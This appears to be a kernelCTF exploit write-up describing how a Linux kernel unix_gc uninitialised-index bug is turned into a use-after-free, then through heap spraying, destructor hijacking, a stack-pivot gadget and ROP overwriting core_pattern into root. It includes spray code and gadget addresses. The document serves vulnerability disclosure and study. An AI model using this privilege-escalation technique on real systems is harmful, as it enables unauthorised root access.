Exploit Details
===============

In the following, I explain the exploitation process to get a flag on LTS-6.12.56

# Summary
At at high level, the exploit performs the following things:

- create the uninit `scc_index` to make `unix_gc` wrongly collected and purged victim's `oob_skb`
- cross cache to skb with controlled value
- trigger free path with controlled destructor and use ROP to overwrite `core_pattern` and get root


# Uninit bug
- Describe in the patch (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=60e6489f8e3b086bd1130ad4450a2c112e863791) 

# Build UAF primitive
In exploit, after freeing the `oob_skb` in victim sk, we sprayed a lot of skb data buffer with proper data and make `oob_skb->prev` to `KNOWN_ADDR`, which is from [Novel Technique](https://github.com/google/security-research/blob/929630c38837570397e6ed757e80ba48069c64a2/pocs/linux/kernelctf/CVE-2025-38477_cos/docs/novel-techniques.md#leave-payload-next-to-kernel-resource-nperm).
```c
for(int i=0;i < sizeof(buf)/0x100 ; i++){
        *(size_t*)&buf[i*0x100] = KNOWN_ADDR;
        *(size_t*)&buf[i*0x100+8] = KNOWN_ADDR;

        *(size_t*)&buf[i*0x100+208] = KNOWN_ADDR; // any readable kernel addr
        //*(int*)&buf[i*0x100+116] = 1;
        *(int*)&buf[i*0x100+112] = 1;
    }
```

After successfully cross-cache `oob_skb` to our controlled data, we can forge `oob_skb->prev` to our `KNOWN_ADDR` with another fake skb
```C
		if (oob_skb->prev != (struct sk_buff *)&sk->sk_receive_queue &&
		    !unix_skb_len(oob_skb->prev)) {
			read_skb = oob_skb->prev;
			__skb_unlink(read_skb, &sk->sk_receive_queue);
		}
	}
...

	consume_skb(read_skb);
```

By free `read_skb`, we can control the kernel RIP by line [1]

```C
void skb_release_head_state(struct sk_buff *skb)
{
	skb_dst_drop(skb);
	if (skb->destructor) {
		DEBUG_NET_WARN_ON_ONCE(in_hardirq());
		skb->destructor(skb); // [1]
	}
```

In the context, register `rbx` pointed to our `KNOWN_ADDR`, which we can put ROP gadget on it, we first use this gadget to do stack pivot:
```assembly
   0xffffffff817059d3 <ff_layout_encode_io_latency+163>:        push   rbx
   0xffffffff817059d4 <ff_layout_encode_io_latency+164>:        or     BYTE PTR [rbx+0x41],bl
   0xffffffff817059d7 <ff_layout_encode_io_latency+167>:        pop    rsp
   0xffffffff817059d8 <ff_layout_encode_io_latency+168>:        pop    r13
   0xffffffff817059da <ff_layout_encode_io_latency+170>:        pop    r14
   0xffffffff817059dc <ff_layout_encode_io_latency+172>:        pop    rbp
   0xffffffff817059dd <ff_layout_encode_io_latency+173>:        jmp    0xffffffff82843b70 <__x86_return_thunk> ; this is ret instruction
```

Then we use ROP to overwrite `core_pattern` and msleep a long time in kernel, meanwhile we trigger a coredump to get root and cat flag.

